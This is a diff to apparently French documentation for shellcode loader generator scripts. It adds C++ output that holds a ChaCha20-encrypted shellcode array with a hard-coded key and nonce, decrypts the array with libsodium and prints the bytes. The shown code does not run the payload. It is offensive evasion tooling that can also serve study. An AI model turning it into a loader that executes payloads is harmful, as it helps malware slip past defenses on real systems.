@@ -1,4 +1,4 @@
-le code cpp générer par le script :
+le code cpp générer par le script loadershellcode2.py :
 
 ``` cpp#include <map>
 #include <vector>
@@ -251,6 +251,46 @@ int main() {
     return 0;
 }
 
+
+```
+le code cpp générer par le script loadershellcode3.py :
+
+``` cpp
+#include <iostream>
+#include <cstdint>
+#include <sodium.h>
+using namespace std;
+uint8_t shellcode_encrypted[] = { 0xef, 0x78, 0x61, 0xf8, 0xe9, 0x6c, 0x60, 0xd1, 0xb3, 0xd4, 0xff, 0x03, 0x04, 0xe8, 0x37, 0xbb, 0x89, 0xf6, 0xe0, 0x0d, 0x95, 0xd4, 0x1a, 0xad, 0xd3, 0x91, 0x95, 0xa3, 0x21, 0xf8, 0x58, 0xc4, 0x51, 0x59, 0xdc, 0x07, 0x93, 0x01, 0x98 };
+const uint32_t shellcode_len = 39;
+uint8_t key[] = { 0x2a, 0xfc, 0x9e, 0x8d, 0x15, 0xc6, 0x82, 0x5e, 0x19, 0x65, 0xab, 0x99, 0x0b, 0xdd, 0x50, 0xfb, 0x63, 0xa6, 0x90, 0x41, 0xbc, 0xe6, 0xc8, 0x26, 0x18, 0xbe, 0x1d, 0x84, 0xf5, 0x4e, 0x99, 0xe1 };
+uint8_t nonce[] = { 0x54, 0xb7, 0x08, 0x15, 0x5e, 0xed, 0xdd, 0x37 };
+
+extern "C" void chacha20_decode_cpp(uint8_t* shellcode, uint32_t length, const uint8_t* key, const uint8_t* nonce) {
+    crypto_stream_chacha20_xor(shellcode, shellcode, length, nonce, key);
+}
+
+int main() {
+    if (sodium_init() < 0) {
+        cerr << "Erreur initialisation libsodium" << endl;
+        return 1;
+    }
+
+    cout << "[+] Shellcode chiffre avant dechiffrement:" << endl;
+    for (uint32_t i = 0; i < shellcode_len; i++) {
+        printf("%02x ", shellcode_encrypted[i]);
+    }
+    cout << endl;
+
+    chacha20_decode_cpp(shellcode_encrypted, shellcode_len, key, nonce);
+
+    cout << "[+] Shellcode dechiffre :" << endl;
+    for (uint32_t i = 0; i < shellcode_len; i++) {
+        printf("%02x ", shellcode_encrypted[i]);
+    }
+    cout << endl;
+
+    return 0;
+}
 
 ``
 
